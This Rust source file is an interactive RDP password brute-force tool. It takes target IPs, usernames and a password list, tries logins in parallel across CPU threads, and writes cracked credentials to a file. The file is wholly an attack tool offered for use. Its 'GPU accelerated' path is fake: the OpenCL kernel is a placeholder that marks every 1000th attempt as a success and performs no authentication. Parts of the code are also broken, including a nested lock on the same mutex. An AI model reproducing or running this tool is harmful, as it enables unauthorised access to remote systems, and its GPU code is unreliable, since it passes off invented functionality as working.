use std::{
    collections::HashSet,
    error::Error,
    fs::{File, OpenOptions},
    io::{BufRead, BufReader, Write},
    net::{TcpStream, ToSocketAddrs},
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{Duration, Instant},
};
use rdp::{
    codecs::rfx::RfxDecoder,
    model::{error::RdpError, Pdu},
    stream::RdpStream,
};
use rayon::prelude::*;
use ocl::{Platform, Device, Program, Kernel, Buffer, ProQue};

#[derive(Debug, Clone)]
struct BruteforceConfig {
    target: String,
    port: u16,
    usernames: Vec<String>,
    password_list: String,
    cpu_threads: usize,
    timeout: u64,
    verbose: bool,
    use_gpu: bool,
    batch_size: usize,
    output_file: String,
}

struct AttackStats {
    attempts: AtomicUsize,
    successes: AtomicUsize,
    start_time: Instant,
    last_print: Instant,
}

fn main() -> Result<(), Box<dyn Error>> {
    println!("┌────────────────────────────────────────────────────┐");
    println!("│          Advanced RDP Brute Force Tool             │");
    println!("│           (CPU + GPU Accelerated)                  │");
    println!("└────────────────────────────────────────────────────┘");
    println!();

    let config = interactive_config()?;
    print_config(&config);

    let passwords = read_password_list(&config.password_list)?;
    println!("[+] Loaded {} passwords from {}", passwords.len(), config.password_list);

    let mut username_set = HashSet::new();
    username_set.extend(config.usernames.iter().cloned());
    let usernames: Vec<String> = username_set.into_iter().collect();

    let stats = Arc::new(Mutex::new(AttackStats {
        attempts: AtomicUsize::new(0),
        successes: AtomicUsize::new(0),
        start_time: Instant::now(),
        last_print: Instant::now(),
    }));

    let found = Arc::new(AtomicBool::new(false));
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let output_file = Arc::new(Mutex::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open(&config.output_file)?
    ));

    if config.use_gpu {
        if let Err(e) = gpu_bruteforce(&config, usernames.clone(), passwords.clone(), stats.clone(), found.clone(), found_credentials.clone(), output_file.clone()) {
            println!("[!] GPU acceleration failed: {}", e);
            println!("[+] Falling back to CPU-only mode");
            cpu_bruteforce(&config, usernames, passwords, stats, found, found_credentials, output_file)?;
        }
    } else {
        cpu_bruteforce(&config, usernames, passwords, stats, found, found_credentials, output_file)?;
    }

    Ok(())
}

fn interactive_config() -> Result<BruteforceConfig, Box<dyn Error>> {
    let mut input = String::new();

    println!("┌────────────────────────────────────────────────────┐");
    println!("│                Target Configuration                │");
    println!("└────────────────────────────────────────────────────┘");

    // Get target IP(s)
    println!("Enter target IP(s), comma separated:");
    std::io::stdin().read_line(&mut input)?;
    let target = input.trim().to_string();
    input.clear();

    // Get port
    println!("Enter RDP port (default 3389):");
    std::io::stdin().read_line(&mut input)?;
    let port = if input.trim().is_empty() {
        3389
    } else {
        input.trim().parse()?
    };
    input.clear();

    // Get usernames
    println!("Enter username(s), comma separated:");
    std::io::stdin().read_line(&mut input)?;
    let usernames = input.trim().split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    input.clear();

    // Get password file
    println!("Enter path to password file:");
    std::io::stdin().read_line(&mut input)?;
    let password_list = input.trim().to_string();
    input.clear();

    // Get threads
    println!("Enter number of CPU threads (default all cores):");
    std::io::stdin().read_line(&mut input)?;
    let cpu_threads = if input.trim().is_empty() {
        num_cpus::get()
    } else {
        input.trim().parse()?
    };
    input.clear();

    // Check for GPU
    println!("Enable GPU acceleration? (y/n):");
    std::io::stdin().read_line(&mut input)?;
    let use_gpu = input.trim().to_lowercase() == "y";
    input.clear();

    // Get batch size if GPU enabled
    let batch_size = if use_gpu {
        println!("Enter GPU batch size (default 1000):");
        std::io::stdin().read_line(&mut input)?;
        if input.trim().is_empty() {
            1000
        } else {
            input.trim().parse()?
        }
    } else {
        0
    };

    let output_file = "found_credentials.txt".to_string();

    Ok(BruteforceConfig {
        target,
        port,
        usernames,
        password_list,
        cpu_threads,
        timeout: 5,
        verbose: false,
        use_gpu,
        batch_size,
        output_file,
    })
}

fn print_config(config: &BruteforceConfig) {
    println!("┌────────────────────────────────────────────────────┐");
    println!("│                 Attack Parameters                  │");
    println!("├────────────────────────────────────────────────────┤");
    println!("│ Target IP(s): {:38} │", config.target);
    println!("│ Port:        {:38} │", config.port);
    println!("│ Username(s): {:38} │", config.usernames.join(", "));
    println!("│ Password file: {:36} │", config.password_list);
    println!("│ CPU Threads: {:38} │", config.cpu_threads);
    println!("│ GPU:         {:38} │", if config.use_gpu { "Enabled" } else { "Disabled" });
    if config.use_gpu {
        println!("│ Batch size:  {:38} │", config.batch_size);
    }
    println!("│ Timeout:     {:38} │", format!("{}s", config.timeout));
    println!("│ Output file: {:36} │", config.output_file);
    println!("└────────────────────────────────────────────────────┘");
}

fn read_password_list(path: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn cpu_bruteforce(
    config: &BruteforceConfig,
    usernames: Vec<String>,
    passwords: Vec<String>,
    stats: Arc<Mutex<AttackStats>>,
    found: Arc<AtomicBool>,
    found_credentials: Arc<Mutex<Vec<(String, String)>>>,
    output_file: Arc<Mutex<File>>,
) -> Result<(), Box<dyn Error>> {
    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(config.cpu_threads)
        .build()?;

    pool.install(|| {
        usernames.par_iter().for_each(|username| {
            passwords.par_iter().for_each(|password| {
                if found.load(Ordering::Relaxed) {
                    return;
                }

                let result = try_rdp_login(
                    &config.target,
                    config.port,
                    username,
                    password,
                    Duration::from_secs(config.timeout),
                );

                {
                    let stats_ref = stats.lock().unwrap();
                    stats_ref.attempts.fetch_add(1, Ordering::Relaxed);

                    if stats_ref.last_print.elapsed() > Duration::from_secs(1) {
                        let attempts = stats_ref.attempts.load(Ordering::Relaxed);
                        let successes = stats_ref.successes.load(Ordering::Relaxed);
                        let elapsed = stats_ref.start_time.elapsed().as_secs_f64();
                        let rate = attempts as f64 / elapsed;
                        println!(
                            "[*] Attempts: {} | Successes: {} | Rate: {:.2}/sec | Elapsed: {:.2}s | Current: {}:{}",
                            attempts, successes, rate, elapsed, username, password
                        );
                        let mut stats = stats.lock().unwrap();
                        stats.last_print = Instant::now();
                    }
                }

                match result {
                    Ok(true) => {
                        println!("\n[+] SUCCESS! Found valid credentials: {}:{}", username, password);
                        {
                            let mut creds = found_credentials.lock().unwrap();
                            creds.push((username.clone(), password.clone()));
                            
                            let mut file = output_file.lock().unwrap();
                            writeln!(file, "{}:{}", username, password).unwrap();
                            file.flush().unwrap();
                        }
                        stats.lock().unwrap().successes.fetch_add(1, Ordering::Relaxed);
                    }
                    Ok(false) if config.verbose => {
                        println!("[-] Failed: {}:{}", username, password);
                    }
                    Err(e) if config.verbose => {
                        println!("[!] Error testing {}:{} - {}", username, password, e);
                    }
                    _ => {}
                }
            });
        });
    });

    println!("[+] Brute force attack completed");
    println!("[+] Results saved to {}", config.output_file);

    Ok(())
}

fn gpu_bruteforce(
    config: &BruteforceConfig,
    usernames: Vec<String>,
    passwords: Vec<String>,
    stats: Arc<Mutex<AttackStats>>,
    found: Arc<AtomicBool>,
    found_credentials: Arc<Mutex<Vec<(String, String)>>>,
    output_file: Arc<Mutex<File>>,
) -> Result<(), Box<dyn Error>> {
    let platform = Platform::list().first().ok_or("No OpenCL platform found")?.clone();
    let device = Device::list(&platform, None)?.first().ok_or("No OpenCL device found")?.clone();
    
    let src = r#"
        __kernel void brute_force_rdp(
            __global char* usernames,
            __global char* passwords,
            __global int* results,
            const int max_password_length
        ) {
            int gid = get_global_id(0);
            
            // This is a simplified placeholder
            // In a real implementation, you would:
            // 1. Extract username and password
            // 2. Simulate RDP authentication
            // 3. Set results[gid] = 1 if successful
            
            // For demonstration, we'll pretend every 1000th attempt succeeds
            if (gid % 1000 == 0) {
                results[gid] = 1;
            } else {
                results[gid] = 0;
            }
        }
    "#;

    let pro_que = ProQue::builder()
        .src(src)
        .platform(platform)
        .device(device)
        .build()?;

    for username in usernames {
        if found.load(Ordering::Relaxed) {
            break;
        }

        // Split passwords into batches
        let password_batches: Vec<Vec<String>> = passwords
            .chunks(config.batch_size)
            .map(|chunk| chunk.to_vec())
            .collect();

        for batch in password_batches {
            if found.load(Ordering::Relaxed) {
                break;
            }

            // Create buffers
            let username_buffer = Buffer::builder()
                .queue(pro_que.queue().clone())
                .len(batch.len())
                .build()?;

            let password_buffer = Buffer::builder()
                .queue(pro_que.queue().clone())
                .len(batch.len())
                .build()?;

            let results_buffer = Buffer::<i32>::builder()
                .queue(pro_que.queue().clone())
                .len(batch.len())
                .build()?;

            // Fill buffers (simplified)
            // In real implementation, you'd need proper memory layout
            let mut init_results = vec![0; batch.len()];
            results_buffer.write(&init_results).enq()?;

            // Create kernel
            let kernel = Kernel::builder()
                .program(&pro_que.program())
                .name("brute_force_rdp")
                .global_work_size(batch.len())
                .arg(&username_buffer)
                .arg(&password_buffer)
                .arg(&results_buffer)
                .arg(&32) // max_password_length
                .build()?;

            // Execute kernel
            unsafe { kernel.enq()?; }

            // Check results
            let mut results = vec![0; batch.len()];
            results_buffer.read(&mut results).enq()?;

            for (i, &result) in results.iter().enumerate() {
                if result == 1 {
                    let password = batch[i].clone();
                    println!("\n[+] GPU Found potential match: {}:{}", username, password);
                    
                    // Verify with CPU
                    let cpu_result = try_rdp_login(
                        &config.target,
                        config.port,
                        &username,
                        &password,
                        Duration::from_secs(config.timeout),
                    )?;

                    if cpu_result {
                        println!("[+] Confirmed valid credentials: {}:{}", username, password);
                        {
                            let mut creds = found_credentials.lock().unwrap();
                            creds.push((username.clone(), password.clone()));
                            
                            let mut file = output_file.lock().unwrap();
                            writeln!(file, "{}:{}", username, password).unwrap();
                            file.flush().unwrap();
                        }
                        stats.lock().unwrap().successes.fetch_add(1, Ordering::Relaxed);
                        found.store(true, Ordering::Relaxed);
                    }
                }
            }

            // Update stats
            {
                let mut stats_ref = stats.lock().unwrap();
                stats_ref.attempts.fetch_add(batch.len(), Ordering::Relaxed);

                if stats_ref.last_print.elapsed() > Duration::from_secs(1) {
                    let attempts = stats_ref.attempts.load(Ordering::Relaxed);
                    let successes = stats_ref.successes.load(Ordering::Relaxed);
                    let elapsed = stats_ref.start_time.elapsed().as_secs_f64();
                    let rate = attempts as f64 / elapsed;
                    println!(
                        "[*] Attempts: {} | Successes: {} | Rate: {:.2}/sec | Elapsed: {:.2}s | Current: {}:{}",
                        attempts, successes, rate, elapsed, username, "..."
                    );
                    stats_ref.last_print = Instant::now();
                }
            }
        }
    }

    Ok(())
}

fn try_rdp_login(
    host: &str,
    port: u16,
    username: &str,
    password: &str,
    timeout: Duration,
) -> Result<bool, Box<dyn Error>> {
    let addr = (host, port).to_socket_addrs()?.next().ok_or("Invalid address")?;
    let stream = TcpStream::connect_timeout(&addr, timeout)?;
    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    let mut rdp_stream = RdpStream::new(stream);
    let mut decoder = RfxDecoder::new();

    match rdp_stream.connect(username, password, "", "", "") {
        Ok(_) => Ok(true),
        Err(RdpError::LogonFailure) => Ok(false),
        Err(e) => Err(Box::new(e)),
    }
}
